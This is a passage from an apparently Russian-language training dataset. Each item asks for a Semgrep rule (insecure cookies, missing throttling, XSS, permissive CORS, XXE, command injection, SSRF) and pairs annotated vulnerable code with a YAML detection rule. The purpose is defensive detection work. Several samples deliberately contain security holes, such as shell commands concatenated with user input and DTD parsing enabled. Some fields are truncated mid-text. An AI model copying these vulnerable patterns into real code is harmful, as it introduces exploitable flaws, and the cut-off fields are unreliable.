правило Semgrep предназначено для поиска случаев создания нового объекта класса Cookie без явного вызова метода setSecure(true). Первый паттерн соответствует созданию нового экземпляра Cookie, второй паттерн исключает случаи, где метод setSecure вызывается непосредственно после создания объекта. Это позволяет обнаружить ситуации, когда разработчик случайно или намеренно не устанавливает флаг secure для cookie, что может привести к передаче чувствительных данных через небезопасный канал.\n\n# Ключевые элементы:\n- ID: cookie-issecure-false\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "cookie-issecure-false",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: missing-throttle-config\nОписание уязвимости: Django REST framework configuration is missing default rate- limiting options. This could inadvertently allow resource starvation or Denial of Service (DoS) attacks. Add 'DEFAULT_THROTTLE_CLASSES' and 'DEFAULT_THROTTLE_RATES' to add rate-limiting to your application.\nCWE: CWE-770: Allocation of Resources Without Limits or Throttling\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-770: Allocation of Resources Without Limits or Throttling\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-throttle-config.py\n# ok: missing-throttle-config\nREST_FRAMEWORK = {\n    'PAGE_SIZE': 10,\n    'DEFAULT_THROTTLE_CLASSES': [\n        'rest_framework.throttling.AnonRateThrottle',\n        'rest_framework.throttling.UserRateThrottle'\n    ],\n    'DEFAULT_THROTTLE_RATES': {\n        'anon': '100/day',\n        'user': '1000/day'\n    },\n    \"SOMETHING_ELSE\": {1: 2}\n}\n\n# ruleid: missing-throttle-config\nREST_FRAMEWORK = {\n    'PAGE_SIZE': 10\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• REST_FRAMEWORK = {\n    'PAGE_SIZE': 10\n}\n• REST_FRAMEWORK = {\n    'PAGE_SIZE': 10,\n    'DEFAULT_THROTTLE_CLASSES': [],\n    'DEFAULT_THROTTLE_RATES': {}\n}\n\nБезопасные паттерны:  \n• REST_FRAMEWORK = {\n    'PAGE_SIZE': 10,\n    'DEFAULT_THROTTLE_CLASSES': [\n        'rest_framework.throttling.AnonRateThrottle',\n        'rest_framework.throttling.UserRateThrottle'\n    ],\n    'DEFAULT\n• REST_FRAMEWORK = {\n    'PAGE_SIZE': 10,\n    'DEFAULT_THROTTLE_CLASSES': [\n        'rest_framework.throttling.AnonRateThrottle'\n    ],\n    'DEFAULT_THROTTLE_RATES': {\n        'anon': '100/day'\n    }\n}\n\nЛегенда аннотаций:\n- // ruleid:missing-throttle-config: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-throttle-config: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-throttle-config\n  patterns:\n  - pattern-not-inside: |\n      REST_FRAMEWORK = {\n        ...,\n        \"DEFAULT_THROTTLE_RATES\": ...\n      }\n  - pattern-inside: |\n      REST_FRAMEWORK = ...\n  - pattern: REST_FRAMEWORK\n  message: >-\n    Django REST framework configuration is missing default rate-\n    limiting options. This could inadvertently allow resource\n    starvation or Denial of Service (DoS) attacks. Add\n    'DEFAULT_THROTTLE_CLASSES' and 'DEFAULT_THROTTLE_RATES'\n    to add rate-limiting to your application.\n  metadata:\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    - A06:2017 - Security Misconfiguration\n    cwe:\n    - 'CWE-770: Allocation of Resources Without Limits or Throttling'\n    references:\n    - https://www.django-rest-framework.org/api-guide/throttling/#setting-the-throttling-policy\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  severity: WARNING\n  languages: [python]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Django REST Framework, которые не содержат обязательных настроек rate-limiting ('DEFAULT_THROTTLE_CLASSES' и 'DEFAULT_THROTTLE_RATES'). Анализ выполняется путем проверки наличия этих ключей внутри блока конфигурации REST_FRAMEWORK. Если ключи отсутствуют или их значения пусты, правило отмечает это как потенциально опасную ситуацию. Правило использует комбинацию операторов pattern-inside и pattern-not-inside для точного определения местоположения необходимых ключей.\n\n# Ключевые элементы:\n- ID: missing-throttle-config\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-throttle-config",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: var-in-script-tag\nОписание уязвимости: Detected a template variable used in a script tag. Although template variables are HTML escaped, HTML escaping does not always prevent cross-site scripting (XSS) attacks when used directly in JavaScript. If you need this data on the rendered page, consider placing it in the HTML portion (outside of a script tag). Alternatively, use a JavaScript-specific encoder, such as the one available in OWASP ESAPI. For Django, you may also consider using the 'json_script' template tag and retrieving the data in your script by using the element ID (e.g., `document.getElementById`).\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: var-in-script-tag.html\n<!DOCTYPE html>\n<html>\n    <head></head>\n    <body>\n        <script>\n            // ruleid: var-in-script-tag\n            const mydata = {{ mydata_json|safe }};\n            // ruleid: var-in-script-tag\n            const moredata = {{ mydata_json }};\n        </script>\n        <div>\n            <!-- ok: var-in-script-tag -->\n            <p>{{ this_is_fine }}</p>\n        </div>\n    </body>\n\n    <!-- ok: var-in-script-tag -->\n    <script src=\"./{{ reactDemoIndexBundleJs }}\" crossOrigin=\"anonymous\" integrity=\"{{ sri.reactDemoIndexBundleJs }}\"></script>\n\n</html>\n\n\n// File: var-in-script-tag.mustache\n<!-- cf. https://github.com/caiomartini/mustache-demo/blob/97b9200ebd2d27953febff23e6718aa1aa9ee44d/demo-mustache.html -->\n<!DOCTYPE HTML>\n<html>\n\n<head>\n    <title>Demo Mustache.JS</title>\n    <meta charset=\"utf-8\">\n    <link rel=\"stylesheet\" href=\"node_modules\\bootstrap\\dist\\css\\bootstrap.min.css\">\n    <script type=\"text/javascript\" src=\"node_modules\\jquery\\dist\\jquery.min.js\"></script>\n    <script type=\"text/javascript\" src=\"node_modules\\bootstrap\\dist\\js\\bootstrap.min.js\"></script>\n    <script type=\"text/javascript\" src=\"node_modules\\mustache\\mustache.min.js\"></script>\n    <script type=\"text/javascript\" src=\"demo-mustache.js\"></script>\n</head>\n\n<body onload=\"carregarDemo();\">\n    <div class=\"content\">\n        <div id=\"mustache-header\"></div>\n        <div id=\"mustache-cards\"></div>\n    </div>\n</body>\n\n<script type=\"text/javascript\">\n    <!-- ruleid: var-in-script-tag -->\n    var message = {{ message }};\n</script>\n\n<script type=\"text/javascript\">\n    <!-- ruleid: var-in-script-tag -->\n    var message = {{ message }};\n    console.log(message);\n    console.log(\"more statements here\");\n    <!-- ruleid: var-in-script-tag -->\n    var message2 = {{ message2 }};\n    var flash = document.getElementById(\"flash\");\n    flash.text = message;\n</script>\n\n<script type=\"text/javascript\" src=\"mustache.js\"></script>\n<!-- ok: var-in-script-tag -->\n{{ message }}\n  # Ограничиваем длину\n\nОпасные паттерны:\n• <script>const mydata = {{ mydata_json|safe }};</script>\n• <script>var message = {{ message }};</script>\n• <script>var message2 = {{ message2 }};var flash = document.getElementById(\"flash\");flash.text = message;</script>\n\nБезопасные паттерны:  \n• <div><p>{{ this_is_fine }}</p></div>\n• <script type=\"text/javascript\" src=\"./{{ reactDemoIndexBundleJs }}\" crossOrigin=\"anonymous\" integrity=\"{{ sri.reactDemoIndexBundleJs }}\"></script>\n• {{ message }}\n\nЛегенда аннотаций:\n- // ruleid:var-in-script-tag: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:var-in-script-tag: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: var-in-script-tag\n  message: >-\n    Detected a template variable used in a script tag.\n    Although template variables are HTML escaped, HTML\n    escaping does not always prevent cross-site scripting (XSS)\n    attacks when used directly in JavaScript.\n    If you need this data on the rendered page, consider placing it in the HTML\n    portion (outside of a script tag).\n    Alternatively, use a JavaScript-specific encoder, such as the one available\n    in OWASP ESAPI.\n    For Django, you may also consider using the 'json_script' template tag and\n    retrieving the data in your script by using the element ID (e.g., `document.getElementById`).\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://adamj.eu/tech/2020/02/18/safely-including-data-for-javascript-in-a-django-template/?utm_campaign=Django%2BNewsletter&utm_medium=rss&utm_source=Django_Newsletter_12A\n    - https://www.veracode.com/blog/secure-development/nodejs-template-engines-why-default-encoders-are-not-enough\n    - https://github.com/ESAPI/owasp-esapi-js\n    category: security\n    technology:\n    - html-templates\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  languages:\n  - generic\n  paths:\n    include:\n    - '*.mustache'\n    - '*.hbs'\n    - '*.html'\n  severity: WARNING\n  patterns:\n  - pattern-inside: <script ...> ... </script>\n  - pattern-not-inside: <script ... $ATTR = \"...\" ...>\n  - pattern-not-inside: <script ... $ATTR = '...' ...>\n  - pattern: '{{ ... }}'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменных шаблонов внутри тегов скриптов (<script>). Переменные шаблонов обычно подвергаются HTML-экранированию, но при прямом использовании в JavaScript это не всегда предотвращает атаки XSS. Правило использует комбинацию операторов pattern-inside и pattern-not-inside для ограничения области поиска внутри тегов скрипта и исключения случаев, когда атрибуты скрипта содержат текстовые значения. Шаблон {{ ... }} используется для идентификации переменных шаблона.\n\n# Ключевые элементы:\n- ID: var-in-script-tag\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "var-in-script-tag",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: nestjs-header-cors-any\nОписание уязвимости: Access-Control-Allow-Origin response header is set to \"*\". This will disable CORS Same Origin Policy restrictions.\nCWE: CWE-183: Permissive List of Allowed Inputs\nТип анализа: search\nЯзык: typescript",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: search\n- CWE: CWE-183: Permissive List of Allowed Inputs\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: nestjs-header-cors-any.ts\nimport { Controller, Get, Header } from '@nestjs/common';\nimport { NestFactory } from '@nestjs/core';\nimport { AppService } from './app.service';\nimport { AppModule } from './app.module';\n\nasync function bootstrap1() {\n  // ruleid:nestjs-header-cors-any\n  const app = await NestFactory.create(AppModule, {cors: true});\n  await app.listen(3000);\n}\n\nasync function bootstrap2() {\n  const app = await NestFactory.create(AppModule);\n  // ruleid:nestjs-header-cors-any\n  app.enableCors();\n  await app.listen(3000);\n}\n\nasync function bootstrap3() {\n  // ruleid:nestjs-header-cors-any\n  const app = await NestFactory.create(AppModule, {cors: {origin: '*'}});\n  await app.listen(3000);\n}\n\nasync function bootstrap4() {\n  const app = await NestFactory.create(AppModule);\n  // ruleid:nestjs-header-cors-any\n  app.enableCors({origin: '*'});\n  await app.listen(3000);\n}\n\nasync function bootstrap5() {\n  const app = await NestFactory.create(AppModule);\n  // ok:nestjs-header-cors-any\n  app.enableCors({origin: 'google.com'});\n  await app.listen(3000);\n}\n\n// ruleid:nestjs-header-cors-any\n@Controller()\nexport class AppController1 {\n  constructor(private readonly appService: AppService) {}\n\n  @Get()\n  @Header('Access-Control-Allow-Origin', '*')\n  testCtrl1(): string {\n    return this.appService.getHello();\n  }\n\n}\n\n// ruleid:nestjs-header-cors-any\n@Controller()\nexport class AppController2 {\n  constructor(private readonly appService: AppService) {}\n\n  @Get()\n  @Header('access-control-allow-origin', '*')\n  testCtrl2(): string {\n    return this.appService.getHello();\n  }\n}\n\n// ok:nestjs-header-cors-any\n@Controller()\nexport class AppController3 {\n  constructor(private readonly appService: AppService) {}\n\n  @Get()\n  @Header('Access-Control-Allow-Origin', 'google.com')\n  testCtrlOk(): string {\n    return this.appService.getHello();\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• const app = await NestFactory.create(AppModule, {cors: true});\n• app.enableCors();\n• @Header(\\\n\nБезопасные паттерны:  \n• const app = await NestFactory.create(AppModule);\n• app.enableCors({origin: 'google.com'});\n• @Header('Access-Control-Allow-Origin', 'google.com')\n\nЛегенда аннотаций:\n- // ruleid:nestjs-header-cors-any: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:nestjs-header-cors-any: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: nestjs-header-cors-any\n  message: >-\n    Access-Control-Allow-Origin response header is set to \"*\". This will disable CORS Same Origin Policy\n    restrictions.\n  metadata:\n    cwe:\n    - 'CWE-183: Permissive List of Allowed Inputs'\n    asvs:\n      section: 'V14: Configuration Verification Requirements'\n      control_id: 14.4.8 Permissive CORS\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x22-V14-Config.md#v144-http-security-headers-requirements\n      version: '4'\n    category: security\n    technology:\n    - nestjs\n    owasp:\n    - A04:2021 - Insecure Design\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - typescript\n  severity: WARNING\n  pattern-either:\n  - pattern: |\n      class $CN {\n          @Header(\"=~/[Aa][Cc][Cc][Ee][Ss][Ss]-[Cc][Oo][Nn][Tt][Rr][Oo][Ll]-[Aa][Ll][Ll][Oo][Ww]-[Oo][Rr][Ii][Gg][Ii][Nn]/\", '*')\n          $FN(...) {\n              ...\n          }\n      }\n  - pattern: |\n      NestFactory.create($MODULE, {cors: true})\n  - pattern: |\n      NestFactory.create($MODULE, {cors: {origin: '*'}})\n  - pattern: |\n      $APP.enableCors()\n  - pattern: |\n      $APP.enableCors({origin: '*'})\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда заголовок Access-Control-Allow-Origin устанавливается в значение \\\n\n# Ключевые элементы:\n- ID: nestjs-header-cors-any\n- Язык: typescript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "nestjs-header-cors-any",
      "language": "typescript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: xmlreadersettings-unsafe-parser-override\nОписание уязвимости: XmlReaderSettings found with DtdProcessing.Parse on an XmlReader handling a string argument from a public method. Enabling Document Type Definition (DTD) parsing may cause XML External Entity (XXE) injection if supplied with user-controllable data.\nCWE: CWE-611: Improper Restriction of XML External Entity Reference\nТип анализа: taint\nЯзык: csharp\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: taint\n- CWE: CWE-611: Improper Restriction of XML External Entity Reference\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: xmlreadersettings-unsafe-parser-override.cs\npublic void ParseBad(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    // ruleid:xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n            \n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}\n\npublic static void StaticParseBad(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    // ruleid:xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n            \n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}\n\npublic void ParseBad2(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    // ruleid:xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(input,rs);\n            \n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}\n\npublic void ParseBad3(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    using(var reader = new StringReader(input)){\n        // ruleid:xmlreadersettings-unsafe-parser-override\n        XmlReader myReader = XmlReader.Create(reader,rs);\n                \n        while (myReader.Read())\n        {\n            Console.WriteLine(myReader.Value);\n        }\n        Console.ReadLine();\n    }\n}\n\npublic void ParseGood(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Ignore;\n\n    // ok: xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n            \n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n      # Ограничиваем длину\n\nОпасные паттерны:\n• XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n• XmlReader myReader = XmlReader.Create(input,rs);\n• using(var reader = new StringReader(input)){... XmlReader myReader = XmlReader.Create(reader,rs);...}\n\nБезопасные паттерны:  \n• XmlReader myReader = XmlReader.Create(new StringReader(notInput),rs);\n• XmlReader myReader = XmlReader.Create(reader);\n• var notInput = someSafeLoad();... XmlReader myReader = XmlReader.Create(new StringReader(notInput),rs);\n\nЛегенда аннотаций:\n- // ruleid:xmlreadersettings-unsafe-parser-override: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:xmlreadersettings-unsafe-parser-override: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: xmlreadersettings-unsafe-parser-override\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - focus-metavariable: $ARG\n    - pattern-inside: |\n        public $T $M(...,string $ARG,...){...}\n  pattern-sinks:\n  - patterns:\n    - pattern: |\n        XmlReader $READER = XmlReader.Create(...,$RS,...);\n    - pattern-inside: |\n        XmlReaderSettings $RS = new XmlReaderSettings();\n        ...\n        $RS.DtdProcessing = DtdProcessing.Parse;\n        ...        \n  message: XmlReaderSettings found with DtdProcessing.Parse on an XmlReader handling a string argument\n    from a public method. Enabling Document Type Definition (DTD) parsing may cause XML External Entity\n    (XXE) injection if supplied with user-controllable data.\n  languages:\n  - csharp\n  severity: WARNING\n  metadata:\n    category: security\n    references:\n    - https://www.jardinesoftware.net/2016/05/26/xxe-and-net/\n    - https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmldocument.xmlresolver?view=net-6.0#remarks\n    technology:\n    - .net\n    - xml\n    cwe:\n    - 'CWE-611: Improper Restriction of XML External Entity Reference'\n    owasp:\n    - A04:2017 - XML External Entities (XXE)\n    - A05:2021 - Security Misconfiguration\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    impact: MEDIUM\n    likelihood: LOW\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования XmlReaderSettings с параметром DtdProcessing.Parse в методах, принимающих строковые аргументы от публичных методов. Это может привести к XXE-уязвимости при обработке пользовательских данных. Анализ выполняется путем отслеживания источников (строковых аргументов публичных методов) и сопоставления их с местом создания XmlReader, где используется XmlReaderSettings с включенным DtdProcessing.Parse.\n\n# Ключевые элементы:\n- ID: xmlreadersettings-unsafe-parser-override\n- Язык: csharp \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "xmlreadersettings-unsafe-parser-override",
      "language": "csharp",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: command-injection-formatted-runtime-call\nОписание уязвимости: A formatted or concatenated string was detected as input to a java.lang.Runtime call. This is dangerous if a variable is controlled by user input and could result in a command injection. Ensure your variables are not controlled by users or sufficiently sanitized.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: kt",
    "input": "Требования:\n- Язык: kt\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: command-injection-formatted-runtime-call.kt\nclass Cls {\n    fun Cls(input: String) {\n        val r: Runtime = Runtime.getRuntime()\n        // ruleid: command-injection-formatted-runtime-call\n        r.exec(\"/bin/sh -c some_tool\" + input)\n    }\n\n    fun test1(input: String) {\n        val r: Runtime = Runtime.getRuntime()\n        // ruleid: command-injection-formatted-runtime-call\n        r.loadLibrary(String.format(\"%s.dll\", input))\n    }\n\n    fun test2(input: String) {\n        val r: Runtime = Runtime.getRuntime()\n        // ok: command-injection-formatted-runtime-call\n        r.exec(\"echo 'blah'\")\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• r.exec(\"/bin/sh -c some_tool\" + input)\n• r.loadLibrary(String.format(\"%s.dll\", input))\n\nБезопасные паттерны:  \n• r.exec(\"echo 'blah'\")\n• r.loadLibrary(\"some_library\")\n\nЛегенда аннотаций:\n- // ruleid:command-injection-formatted-runtime-call: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:command-injection-formatted-runtime-call: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: command-injection-formatted-runtime-call\n  message: >-\n    A formatted or concatenated string was detected as input to a java.lang.Runtime\n    call.\n    This is dangerous if a variable is controlled by user input and could result in\n    a\n    command injection. Ensure your variables are not controlled by users or sufficiently\n    sanitized.\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#COMMAND_INJECTION.\n    category: security\n    technology:\n    - kt\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  severity: ERROR\n  languages:\n  - kt\n  pattern-either:\n  - pattern: $RUNTIME.exec($X + $Y)\n  - pattern: $RUNTIME.exec(String.format(...))\n  - pattern: $RUNTIME.loadLibrary($X + $Y)\n  - pattern: $RUNTIME.loadLibrary(String.format(...))\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей command-injection-formatted-runtime-call в Kotlin-коде. Анализируется использование методов exec и loadLibrary класса Runtime, где строковые аргументы формируются путем конкатенации или форматирования строк, включающих переменные, которые могут быть контролируемы пользователем. Это может привести к выполнению произвольных команд на стороне сервера, если не предпринять достаточных мер по их санкционированию.\n\n# Ключевые элементы:\n- ID: command-injection-formatted-runtime-call\n- Язык: kt \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "command-injection-formatted-runtime-call",
      "language": "kt",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: html-raw-json\nОписание уязвимости: Unencoded JSON in HTML context is vulnerable to cross-site scripting, because `</script>` is not properly encoded.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: html-raw-json.cshtml\n<script>\n    // ruleid: html-raw-json\n    var a = @Html.Raw(SomeFunc(Model).ToJson());\n</script>\n<script type=\"text/javascript\">\n    SomeOtherCall();\n    // ruleid: html-raw-json\n    var obj = @Html.Raw(Json.Encode(Model));\n    alert(\"hello world\");\n</script>\n<script>\n    // ruleid: html-raw-json\n    var obj = @Html.Raw(JsonConvert.SerializeObject(Model));\n</script>\n<script>\n    // ok: html-raw-json\n    var obj = @Html.Raw(Model.HtmlField);\n</script>\n// ok: html-raw-json\n<div data-json=\"@Json.Encode(Model)\"></div>  # Ограничиваем длину\n\nОпасные паттерны:\n• @Html.Raw(SomeFunc(Model).ToJson())\n• @Html.Raw(Json.Encode(Model))\n• @Html.Raw(JsonConvert.SerializeObject(Model))\n\nБезопасные паттерны:  \n• @Html.Raw(Model.HtmlField)\n• <div data-json=\"@Json.Encode(Model)\"></div>\n\nЛегенда аннотаций:\n- // ruleid:html-raw-json: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:html-raw-json: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: html-raw-json\n  patterns:\n  - pattern-either:\n    - pattern: '@Html.Raw(Json.Encode(...))'\n    - pattern: '@Html.Raw(JsonConvert.SerializeObject(...))'\n    - pattern: '@Html.Raw(...ToJson(...))'\n  message: Unencoded JSON in HTML context is vulnerable to cross-site scripting, because `</script>` is\n    not properly encoded.\n  languages:\n  - generic\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    category: security\n    technology:\n    - razor\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  paths:\n    include:\n    - '*.cshtml'\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода @Html.Raw в Razor-шаблонах ASP.NET MVC, где передаются результаты вызова методов ToJson(), Json.Encode() или JsonConvert.SerializeObject(). Такие конструкции могут привести к XSS-уязвимостям, так как не выполняют должную эскейпинг-обработку вывода JSON-данных внутри HTML-контекста.\n\n# Ключевые элементы:\n- ID: html-raw-json\n- Язык: generic \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "html-raw-json",
      "language": "generic",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: express-puppeteer-injection\nОписание уязвимости: If unverified user data can reach the `puppeteer` methods it can result in Server-Side Request Forgery vulnerabilities\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: express-puppeteer-injection.js\nconst express = require('express')\nconst app = express()\nconst port = 3000\nconst puppeteer = require('puppeteer')\n\napp.get('/', async (req, res) => {\n    const browser = await puppeteer.launch()\n    const page = await browser.newPage()\n    const url = `https://${req.query.name}`\n    // ruleid: express-puppeteer-injection\n    await page.goto(url)\n\n    await page.screenshot({path: 'example.png'})\n    await browser.close()\n\n    res.send('Hello World!')\n})\n\napp.post('/test', async (req, res) => {\n    const browser = await puppeteer.launch()\n    const page = await browser.newPage()\n    // ruleid: express-puppeteer-injection\n    await page.setContent(`${req.body.foo}`)\n\n    await page.screenshot({path: 'example.png'})\n    await browser.close()\n\n    res.send('Hello World!')\n})\n\nconst controller = async (req, res) => {\n    const browser = await puppeteer.launch();\n    const page = await browser.newPage();\n    const body = req.body.foo;\n    // ruleid: express-puppeteer-injection\n    await page.setContent('<html>' + body + '</html>');\n\n    await page.screenshot({path: 'example.png'});\n    await browser.close();\n\n    res.send('Hello World!');\n}\n\napp.post('/test2', async (req, res) => {\n    const browser = await puppeteer.launch()\n    const page = await browser.newPage()\n    // ruleid: express-puppeteer-injection\n    await page.evaluateOnNewDocument(`${req.body.foo}`)\n\n    await page.screenshot({path: 'example.png'})\n    await browser.close()\n\n    res.send('Hello World!')\n})\n\nconst controller2 = async (req, res) => {\n    const browser = await puppeteer.launch();\n    const page = await browser.newPage();\n    const body = req.body.foo;\n    // ruleid: express-puppeteer-injection\n    await page.evaluate('alert(' + body + ')');\n\n    await page.screenshot({path: 'example.png'});\n    await browser.close();\n\n    res.send('Hello World!');\n}\n\napp.post('/test2', controller)\n\napp.post('/ok-test', async (req, res) => {\n    const browser = await puppet  # Ограничиваем длину\n\nОпасные паттерны:\n• await page.goto(url)\n• await page.setContent(req.body.foo)\n• await page.evaluate(body)\n\nБезопасные паттерны:  \n• await page.goto('https://example.com')\n• const body = '<div>123</div>'; await page.setContent('<html>' + body + '</html>');\n• await page.evaluateOnNewDocument('https://example.com')\n\nЛегенда аннотаций:\n- // ruleid:express-puppeteer-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:express-puppeteer-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
